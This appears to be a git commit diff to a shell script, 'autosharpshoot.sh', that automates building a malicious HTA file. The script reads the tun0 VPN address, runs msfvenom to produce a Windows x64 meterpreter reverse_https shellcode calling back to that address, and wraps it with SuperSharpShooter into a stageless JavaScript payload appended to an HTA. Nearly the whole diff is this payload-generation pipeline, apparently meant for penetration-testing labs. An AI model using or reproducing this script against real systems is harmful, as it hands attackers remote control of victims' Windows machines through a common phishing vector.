b7fa9426136d497aed902246b6ebed67a4796729
Mesumine <mesumine@gmail.com>
2023-03-05 01:01:23 -0500

    rixed code

--- autosharpshoot.sh
+++ autosharpshoot.sh
@@ -6,12 +6,16 @@ then
 else
   port=$1
 fi
+
+#get ip address of tun0
 ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
 echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"
-cd /opt/SuperSharpShooter
-msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$1 -f raw -o shell.txt
 
-python3 sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output payload
+
+msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$port -f raw -o shell.txt
+
+
+python3 ./SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output payload
 
 cat payload.head > payload.hta
 cat ./output/payload.js >> payload.hta
